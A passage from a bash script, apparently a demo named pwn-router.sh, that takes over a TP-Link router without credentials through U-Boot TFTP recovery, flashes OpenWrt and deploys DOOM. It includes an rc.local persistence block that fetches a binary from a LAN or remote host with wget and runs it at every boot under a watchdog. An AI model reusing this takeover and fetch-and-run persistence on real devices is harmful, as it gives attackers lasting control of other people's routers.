        deb="$(find "$tmp" -maxdepth 1 -name '*.deb' | head -1)"
        dpkg-deb -x "$deb" "$tmp/extracted"
        mkdir -p "$DOOM_DIR"
        cp "$tmp/extracted/usr/share/games/doom/doom1.wad" "$WAD_PATH"
    else
        fail "Couldn't fetch doom-wad-shareware via apt. Put doom1.wad (SHA1 $WAD_SHA1_EXPECT) at $WAD_PATH"
    fi

    local got; got="$(sha1sum "$WAD_PATH" | cut -d' ' -f1)"
    [[ "$got" == "$WAD_SHA1_EXPECT" ]] || fail "SHA1 mismatch: $got != $WAD_SHA1_EXPECT"
    info "doom1.wad verified ✓"
    rm -rf "$tmp"
}

doom_serve_fg() {
    step "serve" "Serve $DOOM_DIR over HTTP for the router (foreground)"
    [[ -f "$BIN_PATH" && -f "$WAD_PATH" ]] || fail "Missing binary or WAD — run: $0 doom:build && $0 doom:wad"
    _kill_local_http_server
    if ! ip -4 addr show | grep -q "inet ${SERVER_IP}/"; then
        warn "No interface has ${SERVER_IP} — rc.local fetch will fail."
        warn "Fix: $0 exploit:check-network"
    fi
    info "Serving $DOOM_DIR on ${SERVER_IP}:${HTTP_PORT} (Ctrl-C to stop)"
    cd "$DOOM_DIR" && exec python3 -m http.server "$HTTP_PORT" --bind "$SERVER_IP"
}

ensure_server_running() {
    if _http_server_healthy; then
        info "Firmware HTTP server already up + serving correctly ✓"
        return 0
    fi
    if ss -ltn 2>/dev/null | grep -q ":${HTTP_PORT} "; then
        warn "Server on :${HTTP_PORT} is up but NOT serving correctly (stale dir?) — restarting."
    fi
    _kill_local_http_server
    info "Starting firmware HTTP server in the background..."
    # Proper daemonize via Python's double-fork pattern. Needed because:
    # - Plain `nohup python ... &` leaves python with inherited fds pointing
    #   at the script's stdout (a pipe to `sed`/`tee` on the caller side),
    #   so EOF never fires on the pipe and the script's output appears to
    #   hang on the terminal even though the script finished.
    # - `setsid` from the shell fails silently when the parent is already a
    #   session leader (which it IS inside most harness invocations).
    # Double-fork + os.setsid() + explicit fd replacement gives a true
    # daemon reparented to init, free of any inherited fds.
    python3 - "$DOOM_DIR" "$SERVER_IP" "$HTTP_PORT" "/tmp/doom_httpd.log" <<'PYEOF' &
import os, sys
doom_dir, bind_addr, port, log_path = sys.argv[1], sys.argv[2], int(sys.argv[3]), sys.argv[4]
# First fork: parent exits so the grandparent shell doesn't block on us.
if os.fork() > 0:
    os._exit(0)
os.setsid()
# Second fork: ensures the daemon can never regain a controlling terminal.
if os.fork() > 0:
    os._exit(0)
# Now in the grandchild. Replace fds so no inherited pipes remain open.
with open('/dev/null', 'rb') as _n:
    os.dup2(_n.fileno(), 0)
log = open(log_path, 'ab', buffering=0)
os.dup2(log.fileno(), 1)
os.dup2(log.fileno(), 2)
os.chdir(doom_dir)
from http.server import ThreadingHTTPServer, SimpleHTTPRequestHandler
ThreadingHTTPServer((bind_addr, port), SimpleHTTPRequestHandler).serve_forever()
PYEOF
    # The outer python call itself returns immediately after the first fork,
    # so just wait briefly for the grandchild to open the listening socket.
    wait $! 2>/dev/null || true
    # Poll instead of blind sleep — fast success, bounded failure.
    local n=0
    while [[ $n -lt 10 ]]; do
        _http_server_healthy && { info "Firmware HTTP server up + healthy ✓"; return 0; }
        sleep 0.5; n=$((n+1))
    done
    fail "HTTP server not serving after 5s — see /tmp/doom_httpd.log"
}

doom_deploy() {
    step "deploy" "scp binary + WAD → verify sizes → launch → wait for ready"
    require_router_up
    [[ -f "$BIN_PATH" && -f "$WAD_PATH" ]] || fail "Missing binary or WAD — run: $0 doom:all"

    local local_bin_size local_wad_size
    local_bin_size=$(stat -c%s "$BIN_PATH")
    local_wad_size=$(stat -c%s "$WAD_PATH")
    local need_kb=$(( (local_bin_size + local_wad_size) / 1024 + 500 ))  # +500K headroom

    # One SSH call for: snapshot + free-space check + kill-and-clean.
    info "Pre-flight (free space, kill old process, clean /tmp)..."
    local preflight
    preflight=$(router_ssh "
        free_kb=\$(df /tmp | awk 'NR==2 {print \$4}')
        echo \"FREE_KB=\$free_kb\"
        if [ \"\$free_kb\" -lt $need_kb ]; then
            echo 'INSUFFICIENT_SPACE'
            exit 0
        fi
        killall doomgeneric 2>/dev/null
        rm -f /tmp/doomgeneric /tmp/doom1.wad /tmp/doom.log
        echo OK
    " 2>&1)
    if echo "$preflight" | grep -q INSUFFICIENT_SPACE; then
        local free_kb
        free_kb=$(echo "$preflight" | sed -n 's/^FREE_KB=//p')
        fail "/tmp has only ${free_kb}K free, need ${need_kb}K. Reboot the router first."
    fi
    local free_kb
    free_kb=$(echo "$preflight" | sed -n 's/^FREE_KB=//p')
    info "/tmp: ${free_kb}K free (need ${need_kb}K) ✓"

    info "Copying binary ($(( local_bin_size / 1024 ))K)..."
    scp "${SCP_OPTS[@]}" "$BIN_PATH" root@"$LEDE_LAN_IP":/tmp/doomgeneric >/dev/null \
        || fail "scp of binary failed"
    info "Copying WAD ($(( local_wad_size / 1024 ))K)..."
    scp "${SCP_OPTS[@]}" "$WAD_PATH" root@"$LEDE_LAN_IP":/tmp/doom1.wad >/dev/null \
        || fail "scp of WAD failed"

    # Verify both files landed intact — one SSH call for both sizes.
    # (busybox on this LEDE build has no `stat` applet, so use `wc -c`.)
    local sizes remote_bin_size remote_wad_size
    sizes=$(router_ssh 'wc -c </tmp/doomgeneric; wc -c </tmp/doom1.wad' 2>/dev/null)
    remote_bin_size=$(echo "$sizes" | sed -n '1p' | tr -d ' ')
    remote_wad_size=$(echo "$sizes" | sed -n '2p' | tr -d ' ')
    [[ "$remote_bin_size" == "$local_bin_size" ]] \
        || fail "Binary size mismatch after scp: local=$local_bin_size remote=$remote_bin_size"
    [[ "$remote_wad_size" == "$local_wad_size" ]] \
        || fail "WAD size mismatch after scp: local=$local_wad_size remote=$remote_wad_size"
    info "Both files verified on router ✓"

    # Install the supervisor (watchdog) script and launch doomgeneric under it.
    # The supervisor auto-restarts doomgeneric if port 8000 stops answering —
    # the mongoose single-threaded-event-loop wedge documented in doom_status.
    # Without the watchdog you'd need a manual doom:restart every N minutes
    # whenever a browser tab dies without a clean WebSocket close.
    info "Installing supervisor script + launching under watchdog..."
    local watcher; watcher=$(mktemp)
    _doom_watcher_script > "$watcher"
    scp "${SCP_OPTS[@]}" "$watcher" root@"$LEDE_LAN_IP":/tmp/doom_watch.sh >/dev/null \
        || fail "scp of supervisor failed"
    rm -f "$watcher"
    # busybox ash has no nohup/disown — but with no pty requested (no -t)
    # there's no controlling tty to send SIGHUP, so plain '&' survives.
    router_ssh 'chmod +x /tmp/doomgeneric /tmp/doom_watch.sh; killall doom_watch.sh 2>/dev/null; /tmp/doom_watch.sh >/dev/null 2>&1 &' >/dev/null

    info "Polling :8000 for mongoose to bind..."
    if _wait_for_doom_ready 15; then
        info "DOOM is running — http://${LEDE_LAN_IP}:8000/ ✓"
        info "Auto-recovery: supervisor polls every 30s + respawns on wedge/exit."
    else
        warn "DOOM did not start serving within 15s. Diagnostics:"
        router_ssh 'echo "--- ps ---"; ps w | grep -v grep | grep -E "doom"; echo "--- doom.log tail ---"; tail -20 /tmp/doom.log 2>&1' 2>/dev/null | sed 's/^/    /'
        return 1
    fi
}

doom_persist() {
    step "persist" "Install robust /etc/rc.local autostart + ensure firmware server"
    require_router_up
    ensure_server_running

    local local_bin_size local_wad_size
    local_bin_size=$(stat -c%s "$BIN_PATH")
    local_wad_size=$(stat -c%s "$WAD_PATH")

    # /etc/rc.local lives in /overlay so it persists; /tmp is tmpfs and
    # wipes at boot, so re-fetch binary+WAD from the LAN host every boot.
    # The script below:
    #   • Waits up to 60s for the LAN host (br-lan takes ~18-20s to reach
    #     forwarding state after boot, so a shorter wait races the network).
    #   • Fetches each artifact with 3 retries + size verification. The
    #     original single-try wget silently produced zero-byte files on a
    #     dropped boot-time packet; this version catches that.
    #   • Launches via the supervisor (same /tmp/doom_watch.sh we use in
    #     doom:deploy) so a mid-session mongoose wedge auto-recovers in
    #     ~30-60s with no manual intervention.
    #   • Timestamps everything to /tmp/doom_boot.log for 'doom:logs'.
    #
    # Note: rc.local inlines the supervisor loop directly rather than relying
    # on /tmp/doom_watch.sh being on disk — because /tmp is tmpfs, the file
    # from a previous doom:deploy run would be gone after reboot. We refetch
    # it from the LAN host alongside the binary+WAD.
    local rc_local; rc_local="$(mktemp)"
    cat > "$rc_local" <<RCLOCAL
# Put your custom commands here that should be executed once
# the system init finished. By default this file does nothing.

# DOOM-on-router autostart (installed by pwn-router.sh).
(
    SERVER="${SERVER}"
    LOG=/tmp/doom_boot.log
    EXP_BIN=${local_bin_size}
    EXP_WAD=${local_wad_size}

    log() { echo "\$(date -u +%H:%M:%S) \$*" >> "\$LOG"; }

    : > "\$LOG"
    log "=== rc.local DOOM fetch starting (expecting bin=\$EXP_BIN wad=\$EXP_WAD) ==="

    # Wait up to 60s for the LAN HTTP server to be reachable.
    i=0
    while [ "\$i" -lt 60 ]; do
        if wget -q --spider "\$SERVER/doomgeneric-mips-be" 2>/dev/null; then
            log "server reachable after \${i}s"
            break
        fi
        sleep 1
        i=\$((i + 1))
    done
    if [ "\$i" -ge 60 ]; then
        log "ERROR: server unreachable after 60s, giving up"
        exit 1
    fi

    # Fetch each artifact with retries + size verification.
    fetch_verify() {
        src=\$1; dst=\$2; expected=\$3
        attempt=0
        while [ "\$attempt" -lt 3 ]; do
            rm -f "\$dst"
            wget -q -O "\$dst" "\$SERVER/\$src"
            got=\$(wc -c < "\$dst" 2>/dev/null || echo 0)
            if [ "\$got" = "\$expected" ]; then
                log "fetched \$src (\$got bytes) OK"
                return 0
            fi
            log "fetch \$src attempt \$((attempt+1)): got \$got, expected \$expected"
            attempt=\$((attempt + 1))
            sleep 2
        done
        log "ERROR: \$src never fetched correctly in 3 tries"
        return 1
    }

    fetch_verify doomgeneric-mips-be /tmp/doomgeneric \$EXP_BIN || exit 1
    fetch_verify doom1.wad           /tmp/doom1.wad   \$EXP_WAD || exit 1
    chmod +x /tmp/doomgeneric

    # Supervisor loop: launch doomgeneric with a parallel healthchecker,
    # and \`wait\` on the game process so crashes/kills respawn in ~2s
    # (not up-to-30s). Same pattern as /tmp/doom_watch.sh in doom:deploy.
    log "entering supervisor loop"
    launches=0
    while true; do
        launches=\$((launches + 1))
        log "launching doomgeneric (attempt #\$launches)"
        cd /tmp && ./doomgeneric >>"\$LOG" 2>&1 &
        DOOM_PID=\$!

        # Parallel :8000 healthchecker — kills doom on wedge.
        (
            while sleep 30; do
                kill -0 \$DOOM_PID 2>/dev/null || exit 0
                if ! wget -q --spider --timeout=5 http://127.0.0.1:8000/ 2>/dev/null; then
                    echo "\$(date -u +%H:%M:%S) [watch] :8000 not answering, killing pid \$DOOM_PID" >>"\$LOG"
                    kill -9 \$DOOM_PID 2>/dev/null
                    exit 0
                fi
            done
        ) &
        HC_PID=\$!

        wait \$DOOM_PID 2>/dev/null
        kill \$HC_PID 2>/dev/null; wait \$HC_PID 2>/dev/null

        log "doomgeneric exited (pid \$DOOM_PID), respawning in 2s"
        sleep 2
    done
) &

exit 0
RCLOCAL
    scp "${SCP_OPTS[@]}" "$rc_local" root@"$LEDE_LAN_IP":/etc/rc.local >/dev/null \
        || fail "scp of rc.local failed"
    rm -f "$rc_local"
    router_ssh 'chmod +x /etc/rc.local' >/dev/null
    info "Persistence installed ✓ (verify with: $0 doom:reboot)"
    warn "Keep the firmware HTTP server (this VM, :${HTTP_PORT}) running —"
    warn "rc.local re-fetches both artifacts at every boot."
}

doom_reboot() {
    step "reboot" "Reboot router → wait for ping → poll until DOOM is serving"
    require_router_up
    router_ssh reboot 2>/dev/null || true
    _cleanup_ssh_master
    info "Waiting for router to go down..."
    local n=0
    while router_up; do sleep 1; n=$((n+1)); [[ $n -gt 20 ]] && break; done
    info "Waiting for ping to return..."
    local ping_wait=0
    until router_up; do
        sleep 2; ping_wait=$((ping_wait + 2))
        [[ $ping_wait -gt 90 ]] && fail "Still down after 90s."
    done
    info "Pingable after ${ping_wait}s. Waiting for rc.local to launch DOOM..."
    local total=0
    while [[ $total -lt 90 ]]; do
        if _doom_serving; then
            info "DOOM serving at http://${LEDE_LAN_IP}:8000/ (${total}s post-ping) ✓"
            return 0
        fi
        sleep 2
        total=$((total + 2))
    done
    warn "DOOM did not come up within 90s of first ping. See: $0 doom:logs"
    doom_status
    return 1
}

doom_status() {
    step "status" "Current DOOM state"
    if ! router_up; then
        warn "Router not reachable at $LEDE_LAN_IP"
        return 1
    fi

    local snap
    snap=$(_router_doom_snapshot)
    local proc watch_state listen rc_state tmp_df
    proc=$(echo "$snap" | awk '/^---ps---$/{f=1;next} /^---/{f=0} f')
    watch_state=$(echo "$snap" | awk '/^---watch---$/{f=1;next} /^---/{f=0} f')
    listen=$(echo "$snap" | awk '/^---listen---$/{f=1;next} /^---/{f=0} f')
    rc_state=$(echo "$snap" | awk '/^---rc.local---$/{f=1;next} /^---/{f=0} f')
    tmp_df=$(echo "$snap" | awk '/^---free---$/{f=1;next} /^---/{f=0} f')

    if _doom_serving; then
        info "DOOM is running + serving — http://${LEDE_LAN_IP}:8000/ ✓"
    elif [[ -n "$proc" && -z "$listen" ]]; then
        warn "DOOM process alive but NOT listening on 8000 — looks wedged."
        warn "(stale browser conn stuck in mongoose's event loop)"
        warn "Supervisor should auto-recover within ~30s. Force now: $0 doom:restart"
    else
        warn "DOOM is NOT currently serving. On-router state:"
        echo "$snap" | sed 's/^/    /'
    fi

    info "$watch_state"
    info "$rc_state"
    info "/tmp usage: $(echo "$tmp_df" | awk '{print $3"/"$2" ("$5" used), "$4" free"}')"

    if ss -ltn 2>/dev/null | grep -q ":${HTTP_PORT} "; then
        if _http_server_healthy; then
            info "Firmware HTTP server up + serving both artifacts ✓"
        else
            warn "HTTP server on :${HTTP_PORT} is up but NOT serving correctly."
            warn "Fix: $0 doom:serve  (or doom:persist)"
        fi
    else
        warn "Firmware HTTP server NOT running — persistence will fail at reboot."
        warn "Fix: $0 doom:serve  (or doom:persist)"
    fi
}

doom_restart() {
    step "restart" "Kill wedged doomgeneric only — supervisor respawns it"
    require_router_up
    # With the supervisor in place, we only need to kill doomgeneric itself;
    # the watchdog respawns it within ~2s. If no supervisor is running (e.g.
    # someone invoked /tmp/doomgeneric by hand without doom_watch.sh), fall
    # back to re-launching the supervisor explicitly.
    router_ssh '
        killall -9 doomgeneric 2>/dev/null
        if ! pgrep -f doom_watch.sh >/dev/null 2>&1; then
            if [ -x /tmp/doom_watch.sh ]; then
                /tmp/doom_watch.sh >/dev/null 2>&1 &
            else
                sleep 1; cd /tmp && ./doomgeneric >/tmp/doom.log 2>&1 &
            fi
        fi
        true
    ' >/dev/null
    info "Polling :8000..."
    if _wait_for_doom_ready 10; then
        info "Relaunched + serving ✓"
    else
        warn "Still not serving after 10s. Diagnostics:"
        router_ssh 'ps w | grep -v grep | grep -E "doom"; tail -10 /tmp/doom.log 2>&1' 2>/dev/null | sed 's/^/    /'
        return 1
    fi
}

doom_clean() {
    step "clean" "Wipe deployed DOOM state (router /tmp + rc.local + local HTTP)"
    if router_up; then
        # Kill supervisor FIRST (so it doesn't respawn doomgeneric), then
        # kill doomgeneric itself. Order matters.
        router_ssh '
            pkill -9 -f doom_watch.sh 2>/dev/null
            killall -9 doomgeneric 2>/dev/null
            rm -f /tmp/doomgeneric /tmp/doom1.wad /tmp/doom.log /tmp/doom_boot.log /tmp/doom_watch.sh
            if grep -q "DOOM-on-router autostart" /etc/rc.local 2>/dev/null; then
                cat > /etc/rc.local <<EOF
# Put your custom commands here that should be executed once
# the system init finished. By default this file does nothing.

exit 0
EOF
                chmod +x /etc/rc.local
            fi
            true
        ' >/dev/null
        info "Router: killed supervisor + doomgeneric, cleared /tmp artifacts, stripped rc.local DOOM block ✓"
    else
        warn "Router not reachable — skipping on-router cleanup"
    fi
    _kill_local_http_server
    info "Local HTTP server stopped ✓"
}

doom_logs() {
    step "logs" "Aggregate recent logs (router + local HTTP server)"
    if router_up; then
        echo ""
        echo "── /tmp/doom.log (direct deploy / restart runs) ──"
        router_ssh 'cat /tmp/doom.log 2>/dev/null | tail -40' 2>/dev/null || echo "(none)"
        echo ""
        echo "── /tmp/doom_boot.log (rc.local persistence runs) ──"
        router_ssh 'cat /tmp/doom_boot.log 2>/dev/null | tail -40' 2>/dev/null || echo "(none)"
    else
        warn "Router not reachable — skipping router logs"
    fi
    echo ""
    echo "── /tmp/doom_httpd.log (local Python http.server) ──"
    tail -40 /tmp/doom_httpd.log 2>/dev/null || echo "(none)"
}

doom_ssh() { require_router_up; exec ssh "${SSH_OPTS[@]}" root@"$LEDE_LAN_IP"; }

doom_all() {
    doom_build
    doom_wad
    require_router_up
    doom_deploy
    doom_persist
    doom_status
}

# =============================================================================
# Dispatcher
# =============================================================================
usage() {
    cat <<EOF
Usage: $0 <command> [args]

  ── Base exploit (U-Boot TFTP recovery, no credentials) ─────────────
  exploit:flash-openwrt            Flash stock OpenWrt (needs scp-based doom:deploy after)
  exploit:flash-remote-doom <URL>  ONE-TIME-PHYSICAL variant: builds + flashes a custom
                                   OpenWrt image with baked-in rc.local that auto-fetches
                                   DOOM from <URL> on every boot. After this runs, NO
                                   further LAN presence is needed. See README § "How
                                   often does the attacker need to be present?"
  exploit:flash-stock              Revert to stock TP-Link firmware
  exploit:check-network            L2/bridge adjacency diagnostic + fix instructions
  exploit:status                   Which firmware is currently running?
  exploit:ssh                      SSH to the router (OpenWrt only)
  exploit:reboot                   SSH reboot + wait for it back

  ── DOOM demo (requires OpenWrt flashed first) ──────────────────────
  doom:all                   build (if needed) → wad → deploy → persist → status
  doom:build                 Cross-compile doomgeneric for big-endian MIPS
  doom:wad                   Fetch/verify the correct full doom1.wad
  doom:deploy                scp binary+wad to router + launch now
  doom:persist               Install /etc/rc.local autostart + start firmware server
  doom:serve                 Run firmware HTTP server in foreground (Ctrl-C to stop)
  doom:status                Is DOOM running? Is HTTP server up for persistence?
  doom:ssh                   SSH to the router (same as exploit:ssh)
  doom:reboot                SSH reboot + poll until DOOM is serving (not blind sleep)
  doom:restart               Kill + relaunch doomgeneric (poll for ready; wedge fix)
  doom:clean                 Wipe deployed state (router /tmp + rc.local + local HTTP)
  doom:logs                  Aggregate doom.log, doom_boot.log, local httpd.log

See:  ./README.md       (overview)
      ./CHEATSHEET.md   (manual copy/paste equivalents)
      ./docs/DOOM.md    (in-game controls)
EOF
}

case "${1:-}" in
    exploit:flash-openwrt|exploit:flash|flash)   exploit_flash openwrt ;;
    exploit:flash-stock|flash-stock)             exploit_flash stock ;;
    exploit:flash-remote-doom|flash-remote-doom) exploit_flash_remote_doom "${2:-}" ;;
    exploit:check-network|check-network)         exploit_check_network ;;
    exploit:status)                              exploit_status ;;
    exploit:ssh)                                 exploit_ssh ;;
    exploit:reboot)                              exploit_reboot ;;

    doom:all|all)                                doom_all ;;
    doom:build|build)                            doom_build ;;
    doom:wad|wad)                                doom_wad ;;
    doom:deploy|deploy)                          doom_deploy ;;
    doom:persist|persist)                        doom_persist ;;
    doom:serve|serve)                            doom_serve_fg ;;
    doom:status|status)                          doom_status ;;
    doom:ssh|ssh)                                doom_ssh ;;
    doom:reboot|reboot)                          doom_reboot ;;
    doom:restart|restart)                        doom_restart ;;
    doom:clean|clean)                            doom_clean ;;
    doom:logs|logs)                              doom_logs ;;

    ""|help|-h|--help)                           usage ;;
    *)                                           usage; exit 1 ;;
esac
